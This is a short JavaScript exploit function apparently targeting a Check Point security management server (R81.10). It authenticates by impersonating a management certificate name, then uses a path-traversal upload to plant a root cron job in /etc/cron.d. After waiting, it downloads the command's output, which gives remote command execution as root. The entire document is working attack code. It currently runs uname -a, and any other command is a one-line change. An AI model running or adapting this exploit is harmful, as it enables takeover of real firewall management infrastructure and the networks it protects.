export async function execute(loginService, fileService, serverSicName) {
    const session = await loginService.loginNew('management,CN=' + serverSicName);
    const destination = '../../../../../../etc/cron.d/raid-check';
    const output = '/opt/CPsuite-R81.10/fw1/conf/SMC_Files/audit';
    const payload = '* * * * * root /bin/sh -c "uname -a > /opt/CPsuite-R81.10/fw1/conf/SMC_Files/audit 2>&1"\n';
    await fileService.uploadFileToServerFileSystem(session, destination, Buffer.from(payload));
    await new Promise(resolve => setTimeout(resolve, 65000));
    return fileService.downloadRawFile(session, output);
}
